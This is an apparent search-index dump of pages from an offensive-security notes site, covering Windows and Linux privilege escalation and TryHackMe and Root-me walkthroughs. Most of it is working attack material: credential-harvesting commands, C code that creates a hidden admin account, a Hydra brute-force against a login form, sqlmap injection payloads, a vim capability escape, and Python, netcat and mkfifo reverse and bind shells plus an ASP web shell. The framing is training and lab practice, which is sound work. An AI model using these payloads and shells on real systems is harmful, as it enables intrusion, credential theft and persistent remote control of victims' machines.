    "c": "Attack infrastructures  For the best part of the last decades the undefeated champion of C2 post-exploitation frameworks was the Metasploit framework, but the default settings of the tool have been flagged by every Windows security product since 2007. For hacking Linux systems and older Windows systems it can still be a good choice. Some Windows exploits are still useful. Silent Trinity in an attack infrastructure as code (IaC) may offer good alternatives for Windows 10+ systems, at least for now. Metasploit is not the only way to use exploits; you can download exploits from exploit database sites, modify existing exploits to bypass security controls, or create new exploits from scratch.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f15109e88da9c538d4ca69446058f7e4",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Root-me App-Script challenges: Depending on the challenge, elevate privileges or escape the sandbox by exploiting the provided environment. Why?  Practice exploiting environment weaknesses, configuration mistakes and vulnerability patterns in scripts and systems. How?  Bash: System 1 sudo: weak configuration Bash: System 2 LaTeX: Input Powershell: Command Injection Bash: unquoted expression injection Perl: Command injection Bash: cron Python input() Python pickle",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ec23d569fc248b42bd31befb322de1e5",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/escalation",
    "t": "Reuseful escalation patterns ",
    "c": "Reuseful escalation patterns  Host Information  Get OS version, patches, etc.: systeminfo type C:\\Windpws\\system32\\eula.txt type C:\\BOOT.INI Get current user: whoami whoami /priv echo %username% Get environment variables: set List users: net accounts net group net users List user details: net users <user> Network information: ipconfig /all Routing information: netstat -r route print arp -a Firewall information: netsh firewall show state netsh firewall show config List open connections: netstat -aton List scheduled tasks: schtasks /query /fo LIST /v Firewall and AV information  Check Windows defender: sc query windefend View all services running on the machine: sc queryex type= service sc = service control Firewall settings: netsh advfirewall firewall dump netsh firewall show state Show firewall config: netsh firewall show config Services  List Windows services: net start tasklist /SV wmic service list brief sc query state= all Weak services  Find misconfigured permissions by finding executables and running icalcs or cacls commands to determine user permissions. If lucky they may have full (F) or modified (M) permissions for the current user. Also look for unquoted path folders such as C:\\Program Files that run as SYSTEM/Administrator . On newer machines: icacls \"C:\\<path-to-service>.exe\" Older machines: cacls \"C:\\<path-to-service>.exe\" If wmic is available, pull a list with: wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\\" |findstr /i /v \"\"\" Change a weak service by replacing the executable with a malicious one: move <evil-file>.exe \"C:\\Program Files\\<service>\\<file>.exe\" Then reboot the server or wait for system to restart it. Or if possible, inject the service path: sc config <service> binpath= \"<exploit-code>\" Then restart the service: sc stop <service> sc start <service> Windows XP SP1  Windows XP SP1 has a known vulnerability in upnphost. First start by making sure its dependency and service is running: sc config SSDPSRV start= auto net start SSDPSRV Then change the executable path: sc config upnphost binpath= \"<exploit-code>\" sc config upnphost obj= \".\\LocalSystem\" password= \"\" sc qc upnphost Then start the service: net start upnphost If both wmic and sc are not available, use accesschk accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula Space in service path  If the above service search came up with a path such as: C:\\Program Files\\<service>\\<file>.exe This could allow replacement by an evil.exe file in: C:\\Program.exe Start/Stop with denied permissions  If a service gives a permission denied to start or stop, this may or may not be exploitable . Search files and registry  List current directory with metadata, system and data stream files: dir /s /q /R Attempt to find password strings in common files: findstr /spin password *.txt findstr /spin password *.xml findstr /spin password *.config findstr /si password *.ini findstr /spin credentials *.txt findstr /spin credentials *.xml findstr /spin credentials *.config findstr /si credentials *.ini findstr /spin secret *.txt findstr /spin secret *.xml findstr /spin secret *.config findstr /si secret *.ini Attempt to find password strings in all files: findstr /spin \"password\" *.* findstr /spin \"credentials\" *.* findstr /spin \"secret\" *.* Find all common configuration or sensitive files: dir/q \\*.txt /s dir/q \\*.rar /s dir/q \\*.zip /s dir/q \\*.xls /s dir/q \\*.xlsx /s dir/q \\*.ini /s dir/q \\*.cap /s dir/q \\*.pcap /s dir/q \\*.exe /s dir/q \\*.pdf /s Attempt to find password strings in registry settings: reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password Port Forwarding  Using plink.exe. Recommend using secondary user from attacking machine: plink.exe -l <user> -pw <password> <attacking-ipaddress> -R <lport>:127.0.0.1:<rport> Network drives  Find users mapped drives  Show current mapped drives: net share Search registry for user SID: reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\\" /s Then finding the SID, get the network paths and usernames used to connect, if any: reg query \"HKEY_USERS\\<SID>\\Network\" /s Map a drive  Create a network drive: net use Z: \\\\<path>\\ Map to Domain Controller sysvol: net use Z: \\\\<dc>\\SYSVOL Search for group policy xml: z: dir /s /q groups.xml Search for kernel vulnerabilities.  Copy systeminfo to a text file on attacking machine. Download Windows Exploit Suggester: wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py Download bulletin database: wget http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx Install requirements: apt -y install python-xlrd Run: python windows-exploit-suggester.py --systeminfo systeminfo.txt --database BulletinSearch.xlsx Common Simple Overwrite Code  Create an admin user and add to administrator and remote desktop groups: #include <stdlib.h> int main () { system(\"net user <user> <password> /add\"); system(\"net localgroup administrators <user> /add\"); system(\"net localgroup administrators \"Remote Desktop Users\" <user> /add\"); return 0; } Compile: i686-w64-mingw32-gcc <file>.c -lws2_32 -o <output>.exe",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a1e681af09a387e3f950a2886a7c394a",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/hackpark",
    "t": "HackPark ",
    "c": "https://tryhackme.com/room/hackpark HackPark  SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate privileges to root. Scanning  First run a simple port scan (without Ping) nmap -Pn -p- <IP address target machine> -oN portscan portscan: # Nmap 7.92 scan initiated Fri Sep 30 01:06:47 2022 as: nmap -Pn -p- -oN portscan 10.10.104.183 Nmap scan report for 10.10.104.183 Host is up (0.039s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3389/tcp open ms-wbt-server # Nmap done at Fri Sep 30 01:08:46 2022 -- 1 IP address (1 host up) scanned in 119.37 seconds Run an -A scan on the open ports: nmap -Pn -T4 -A -p80,3389 <IP address target machine> -oN servicescan servicescan: # Nmap 7.92 scan initiated Fri Sep 30 01:12:20 2022 as: nmap -Pn -T4 -A -p80,3389 -oN servicescan 10.10.104.183 Nmap scan report for 10.10.104.183 Host is up (0.039s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx 3389/tcp open ssl/ms-wbt-server? | rdp-ntlm-info: | Target_Name: HACKPARK | NetBIOS_Domain_Name: HACKPARK | NetBIOS_Computer_Name: HACKPARK | DNS_Domain_Name: hackpark | DNS_Computer_Name: hackpark | Product_Version: 6.3.9600 |_ System_Time: 2022-09-30T00:13:35+00:00 | ssl-cert: Subject: commonName=hackpark | Not valid before: 2022-09-29T00:05:48 |_Not valid after: 2023-03-31T00:05:48 |_ssl-date: 2022-09-30T00:13:36+00:00; 0s from scanner time. Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (89%) OS CPE: cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 40.18 ms 10.9.0.1 2 40.14 ms 10.10.104.183 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 30 01:13:36 2022 -- 1 IP address (1 host up) scanned in 76.02 seconds There is a web server running on port 80/tcp. Exploring  A short exploration of the site gave me a username and a login page. Welcome page clues A reverse image search gave the name of the clown. The source code of the main page reveals an Administrator user admin . But we already knew that. Brute-force admin  Identify what type of request the form is making to the webserver by going to the login page. Copy the URL: http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ Type of request: # curl -s http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ | grep \"<form\" <form method=\"post\" action=\"login.aspx?ReturnURL=%2fadmin%2f\" id=\"Form1\"> Using Burpsuite Intruder, try a brute-force on that admin user. Fire up Burpsuite, go to login page, set Burpsuite to intercept, and try to log in. Catch the __VIEWSTATE for use in Hydra. __VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2F aa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBa hqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ& __EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjW uzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZcl fGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9 &ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent %24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in Mini hydra cheatsheet: Command Description hydra -P -v Brute force against a protocol of your choice. hydra -v -V -u -L -P -t 1 -u You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) hydra -t 1 -V -f -l -P rdp:// Attack a Windows Remote Desktop with a password list. hydra -l -P . $ip -V http-form-post '/wp-login.php: log=^USER^&pwd=^PASS^&wp-submit= Log In&testcookie=1:S=Location' Craft a more specific request for Hydra to brute force. Constructing the hydra command: -f flag to stop the attack when a valid password is found -l flag to specify the username for the bruteforce attack = admin -P flag to specify the wordlist to use for the bruteforce = /usr/share/wordlists/rockyou.txt IP of the target server = 10.10.39.227 Type of attack = http-post-form Page to attack = “ /Account/login.aspx:__VIEWSTATE... ” In __VIEWSTATE... change UserName=admin to UserName=^USER^ In __VIEWSTATE... change Password=admin to Password=^PASS^ Add a Failed login message to be able to detect when we have success = :Login Failed # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.227 http-post-form \"/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed\" Results: Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-30 05:11:49 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://10.10.39.227:80/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed [80][http-post-form] host: 10.10.39.227 login: admin password: 1qaz2wsx [STATUS] attack finished for 10.10.39.227 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-30 05:12:42 Compromise the machine  Logged in as admin, click on the “” link from the menu.  page with version information # searchsploit blogengine 3.3.6 ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execu | aspx/webapps/47010.py BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal | aspx/webapps/47035.py BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code | aspx/webapps/47011.py BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection | aspx/webapps/47014.py...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "83afdeab22d8ff7d4bd92953a40185b3",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Windows presents an enormous attack surface and most companies run Windows hosts, so we will often find ourselves gaining access to Windows machines. These are all methods on common real-world misconfigurations and flaws in modern and legacy Windows Server and Desktop versions that may be present in a client environment. Why?  After gaining a foothold, enumeration is the key to privilege escalation. Elevating privileges will provide more options for persistence and may reveal information stored locally that can further our access in the environment. How?  Reuseful escalation patterns Harvesting passwords Quick misconfiguration wins Abusing service misconfigurations Abusing dangerous privileges Abusing vulnerable software Shellcode techniques",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6c2c4d80c8ea3fea070e29f0a85db4ac",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/latex",
    "t": "LaTeX: Input ",
    "c": "LaTeX: Input  root-me challenge: LaTeX-Input : Do you know how the input command works? /tmp and /var/tmp are writeable Validation password is stored in $HOME/.passwd Useful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2 Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit. $ ls -la total 676 drwxr-x--- 2 app-script-ch23-cracked app-script-ch23 4096 Dec 10 2021 . drwxr-xr-x 24 root root 4096 Mar 22 15:29 .. -r-xr-x--- 1 app-script-ch23-cracked app-script-ch23 893 Dec 10 2021 ch23.sh -rw-r----- 1 root root 43 Dec 10 2021 .git -r-------- 1 app-script-ch23-cracked app-script-ch23-cracked 93 Dec 10 2021 .passwd -r-------- 1 root root 802 Dec 10 2021 ._perms -rwsr-x--- 1 app-script-ch23-cracked app-script-ch23 661788 Dec 10 2021 setuid-wrapper -r--r----- 1 app-script-ch23-cracked app-script-ch23 262 Dec 10 2021 setuid-wrapper.c $ cat setuid-wrapper.c #include <unistd.h> /* setuid script wrapper */ int main(int arc, char** arv) { char *argv[] = { \"/bin/bash\", \"-p\", \"/challenge/app-script/ch23/ch23.sh\", arv[1] , NULL }; setreuid(geteuid(), geteuid()); execve(argv[0], argv, NULL); return 0; } $ pwd /challenge/app-script/ch23 After several attempts using the hacks from the resources given, I decided to look in other directions and made a swerve to GTFOBins pdflatex . The LaTeX module verbatim permits input of a file without interpreting it. Resources  Latex Global Latex Cheat Sheet Latex Guide Hacking with LaTeX",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c21ae258b6643861f3a6e89bec2998d4",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/bash2",
    "t": "Bash: System 2 ",
    "c": "Bash: System 2  root-me challenge: ELF32-System-2 : Simple script The ls command is not using an absolute path. Create a script to run cat and ignore the flags (create /tmp/ls and then invoke ch12 with a modified path), or use an existing binary like nano . Resources  section-7.html",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ef3a1508e1dd34fc5923af422d9bfd6c",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/game-zone",
    "t": "Game Zone ",
    "c": "https://tryhackme.com/room/gamezone Game Zone  Bruteforce a websites login with Hydra, identify and use a public exploit, then escalate privileges. Exploring  Welcome page clues A reverse image search gave the name of the agent (47). Scanning  Run a simple port scan (without Ping) # nmap -Pn -p- <IP address target machine> -oN portscan portscan: # Nmap 7.92 scan initiated Fri Sep 30 21:09:37 2022 as: nmap -Pn -p- -oN portscan 10.10.13.164 Nmap scan report for 10.10.13.164 Host is up (0.047s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Sep 30 21:11:01 2022 -- 1 IP address (1 host up) scanned in 83.49 seconds Run an -A scan on the open ports: # nmap -Pn -T4 -A -p22,80 <IP address target machine> -oN servicescan servicescan: # Nmap 7.92 scan initiated Fri Sep 30 21:15:40 2022 as: nmap -Pn -T4 -A -p22,80 -oN servicescan 10.10.13.164 Nmap scan report for 10.10.13.164 Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA) | 256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA) |_ 256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Game Zone | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 39.80 ms 10.9.0.1 2 40.16 ms 10.10.13.164 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 30 21:15:58 2022 -- 1 IP address (1 host up) scanned in 17.68 seconds Using SQLMap  In the main page, use ' or 1=1 -- - as username and leave the password blank. This logs you in and calls up a portal.php page with a search box. Intercept a test search on the portal page with Burpsuite: Intercepted search request Save the intercepted request in a .txt file, to feed into sqlmap . Run SQLMap: -r uses the intercepted request you saved earlier --dbms tells SQLMap what type of database management system it is --dump attempts to outputs the entire database # sqlmap -r intercepted-search.txt --dbms=mysql --dump ___ __H__ ___ ___[\"]_____ ___ ___ {1.6.9#stable} |_ -| . [\"] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 22:05:35 /2022-09-30/ [22:05:35] [INFO] parsing HTTP request from 'intercepted-search.txt' [22:05:35] [INFO] testing connection to the target URL [22:05:35] [INFO] checking if the target is protected by some kind of WAF/IPS [22:05:35] [INFO] testing if the target URL content is stable [22:05:36] [INFO] target URL content is stable [22:05:36] [INFO] testing if POST parameter 'searchitem' is dynamic [22:05:36] [WARNING] POST parameter 'searchitem' does not appear to be dynamic [22:05:36] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL') [22:05:36] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks [22:05:36] [INFO] testing for SQL injection on POST parameter 'searchitem' for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y [22:06:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [22:06:18] [WARNING] reflective value(s) found and filtering out [22:06:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)' [22:06:19] [INFO] testing 'Generic inline queries' [22:06:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' [22:06:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' [22:06:22] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string=\"is\") [22:06:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [22:06:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' [22:06:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' [22:06:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' [22:06:22] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' [22:06:22] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable [22:06:22] [INFO] testing 'MySQL inline queries' [22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)' [22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries' [22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' [22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)' [22:06:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' [22:06:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)' [22:06:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' [22:06:33] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable [22:06:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [22:06:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns' [22:06:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [22:06:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [22:06:33] [INFO] target URL appears to have 3 columns in query [22:06:33] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable [22:06:33] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests: --- Parameter: searchitem (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: searchitem=-2346' OR 3692=3692# Type: error-based Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x7176717871,(SELECT (ELT(2162=2162,1))),0x7171766b71),2162)-- XNGt Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: searchitem=test' AND (SELECT 2073 FROM (SELECT(SLEEP(5)))kWHq)-- zuOM Type: UNION query Title: MySQL UNION query (NULL) - 3 columns Payload: searchitem=test' UNION ALL SELECT...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9b9f4ac5e448ae066ad625b855d0bab8",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/capabilities",
    "t": "Exploit capable programs ",
    "c": "Exploit capable programs  Become root on Linux via capabilities: Check for capable programs Leverage program Example: vim  To check for capable programs, use the getcap tool: karen@target:~$ getcap -r / 2>/dev/null /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/ping = cap_net_raw+ep /home/karen/vim = cap_setuid+ep /home/ubuntu/view = cap_setuid+ep Leverage vim and execute a shell using python: vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' Notes  Another method system administrators can use to increase the privilege level of a process or binary is by capabilities. Capabilities help manage privileges at a more granular level. If a SOC analyst needs to use a tool that needs to initiate socket connections, the capabilities of the binary can be changed such that it would get through its task without needing a higher privilege user.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b73dc9a1d50971abb3e833a5b20024f4",
    "u": "https://exploitation.tymyrddin.dev/docs/notes/shells",
    "t": "Common shells ",
    "c": "Common shells  Types of shells  Shells are used for interfacing with a Command Line environment (CLI) like the common bash or sh programs in Linux, and the cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target. Reverse shell  Reverse shells are when the target is forced to execute code that connects back to the attack computer. This requires setting up a listener which would be used to receive the connection on the attack machine. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target. Start a listener on attack machine Start a reverse shell on target machine Bind shell  Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be open up a port to receive on that you can connect to, and obtain remote code execution. This has the advantage of not requiring any configuration on the attack network, but may be prevented by firewalls protecting the target. Start a listener on target machine Connect to listener on target from attack machine Windows bind shells  In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries , and the version used in Kali itself) there is a -e option which allows for executing a process on connection: nc -lvnp <port-number> -e /bin/bash Connecting to the above listener with netcat would result in a bind shell on the target. Windows reverse shells  Netcat: nc <IP address attack machine> <port-number> -e C:\\Windows\\System32\\cmd.exe Python: import os , socket , subprocess , threading ; def s2p ( s , p ): while True : data = s . recv ( 1024 ) if len ( data ) > 0 : p . stdin . write ( data ) def p2s ( s , p ): while True : s . send ( p . stdout . read ( 1 )) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( \"<IP address attack machine>\" , < port - number > )) p = subprocess . Popen ([ \" \\\\ windows \\\\ system32 \\\\ cmd.exe\" ], stdout = subprocess . PIPE , stderr = subprocess . STDOUT , stdin = subprocess . PIPE ) s2p_thread = threading . Thread ( target = s2p , args = [ s , p ]) s2p_thread . daemon = True s2p_thread . start () p2s_thread = threading . Thread ( target = p2s , args = [ s , p ]) p2s_thread . daemon = True p2s_thread . start () try : p . wait () except KeyboardInterrupt : s . close () ASP (Credit: Maceo – maceo @ dogmile.com): <%@ Language=VBScript %> <% Dim oScript Dim oScriptNet Dim oFileSys, oFile Dim szCMD, szTempFile On Error Resume Next ' -- create the COM objects that we will be using -- ' Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\") Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\") Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\") ' -- check for a command that we have posted -- ' szCMD = Request.Form(\".CMD\") If (szCMD <> \"\") Then ' -- Use a poor man's pipe ... a temp file -- ' szTempFile = \"C:\\\" & oFileSys.GetTempName( ) Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) End If %> <HTML> <BODY> <FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\"> <input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\"> <input type=submit value=\"Run\"> </FORM> <PRE> <%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %> <br> <% If (IsObject(oFile)) Then ' -- Read the output from our command and remove the temp file -- ' On Error Resume Next Response.Write Server.HTMLEncode(oFile.ReadAll) oFile.Close Call oFileSys.DeleteFile(szTempFile, True) End If %> </BODY> </HTML> Linux bind shells  On Linux, use this code to create a listener for a bind shell: mkfifo /tmp/f; nc -lvnp <port-number> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f 